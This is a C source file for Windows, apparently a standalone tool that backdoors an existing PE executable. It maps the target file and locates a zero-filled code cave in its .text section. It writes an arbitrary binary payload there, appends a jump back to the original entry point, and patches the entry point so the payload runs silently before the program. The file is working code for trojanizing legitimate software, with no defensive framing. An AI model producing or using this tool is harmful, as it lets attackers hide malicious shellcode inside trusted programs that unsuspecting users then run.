#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "BinToArray/converter.h"

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <binary file> <bin payload>\n", argv[0]);
        return 1;
    }

    const char* payloadFilename = argv[2];
    size_t payloadSize = 0;
    unsigned char* payload = convert_bin_to_array(payloadFilename, &payloadSize);
    if (payload == NULL) {
        fprintf(stderr, "Conversion of %s failed.\n", payloadFilename);
        return 1;
    }

    const char* filename = argv[1];

    HANDLE hFile = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open file\n");
        return 1;
    }

    HANDLE hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    if (hMapFile == NULL) {
        printf("Failed to create file mapping\n");
        return 1;
    }

    LPVOID pMapView = MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (pMapView == NULL) {
        printf("Failed to create map view\n");
        return 1;
    }

    printf("File mapped at: 0x%X\n", pMapView);

    char* pData = (char*)pMapView; // Pointer to the start of the file
    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pData;
    PBYTE pNtHeaderBase = (PBYTE)(pData + pDosHeader->e_lfanew);

    DWORD originalEntryRVA = 0;
    WORD numberOfSections = 0;
    IMAGE_SECTION_HEADER* firstSection = NULL;

    if (((PIMAGE_NT_HEADERS32)pNtHeaderBase)->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        IMAGE_NT_HEADERS32* pNtHeader32 = (IMAGE_NT_HEADERS32*)pNtHeaderBase;
        originalEntryRVA = pNtHeader32->OptionalHeader.AddressOfEntryPoint;
        numberOfSections = pNtHeader32->FileHeader.NumberOfSections;
        firstSection = IMAGE_FIRST_SECTION(pNtHeader32);

        printf("Binary Architecture: 32-bit\n");
    } else if (((PIMAGE_NT_HEADERS64)pNtHeaderBase)->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        IMAGE_NT_HEADERS64* pNtHeader64 = (IMAGE_NT_HEADERS64*)pNtHeaderBase;
        originalEntryRVA = pNtHeader64->OptionalHeader.AddressOfEntryPoint;
        numberOfSections = pNtHeader64->FileHeader.NumberOfSections;
        firstSection = IMAGE_FIRST_SECTION(pNtHeader64);

        printf("Binary Architecture: 64-bit\n");
    } else {
        printf("Unknown PE format\n");
        return 1;
    }

    IMAGE_SECTION_HEADER* textSectionHeader = NULL;
    for (int i = 0; i < numberOfSections; i++) {
        IMAGE_SECTION_HEADER* section = firstSection + i;
        if (strncmp((char*)section->Name, ".text", 5) == 0) {
            textSectionHeader = section;
            break;
        }
    }

    if (textSectionHeader == NULL) {
        printf("Failed to find .text section\n");
        return 1;
    }
    
    unsigned char* textRawData = (unsigned char*)(pData + textSectionHeader->PointerToRawData);
    DWORD textSizeRawData = textSectionHeader->SizeOfRawData;
    DWORD originalEntryRaw = textSectionHeader->PointerToRawData + (originalEntryRVA - textSectionHeader->VirtualAddress);
    
    printf("Original entry point: 0x%X (Raw: 0x%X)\n", originalEntryRVA, originalEntryRaw);
    
    int caveStartOffset = -1;
    int freeSpaceCount = 0;
    for (int i = 0; i < textSizeRawData; i++) {
        if (textRawData[i] == 0x00) {
            freeSpaceCount++;
            
            if (freeSpaceCount >= payloadSize + 5) {
                caveStartOffset = i - (payloadSize + 5) + 1;
                break;
            }
        } else {
            freeSpaceCount = 0;
        }
    }
    
    if (caveStartOffset == -1) {
        printf("Failed to find cave\n");
        return 1;
    }

    printf("Cave found at address: 0x%X\n", textRawData + caveStartOffset);

    unsigned char jmpBackToEntryPoint[5] = {0xE9, 0, 0, 0, 0};
    DWORD jmpBackOffset = originalEntryRVA - (textSectionHeader->VirtualAddress + caveStartOffset + payloadSize + 5);
    
    memcpy(textRawData + caveStartOffset, payload, payloadSize);
    memcpy(jmpBackToEntryPoint + 1, &jmpBackOffset, sizeof(DWORD));
    memcpy(textRawData + caveStartOffset + payloadSize, jmpBackToEntryPoint, sizeof(jmpBackToEntryPoint));

    if (((PIMAGE_NT_HEADERS32)pNtHeaderBase)->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        ((PIMAGE_NT_HEADERS32)pNtHeaderBase)->OptionalHeader.AddressOfEntryPoint = textSectionHeader->VirtualAddress + caveStartOffset;
    } else {
        ((PIMAGE_NT_HEADERS64)pNtHeaderBase)->OptionalHeader.AddressOfEntryPoint = textSectionHeader->VirtualAddress + caveStartOffset;
    }
    printf("Patched entry point: 0x%X\n", textSectionHeader->VirtualAddress + caveStartOffset);

    UnmapViewOfFile(pMapView);
    CloseHandle(hMapFile);
    CloseHandle(hFile);
    return 0;
}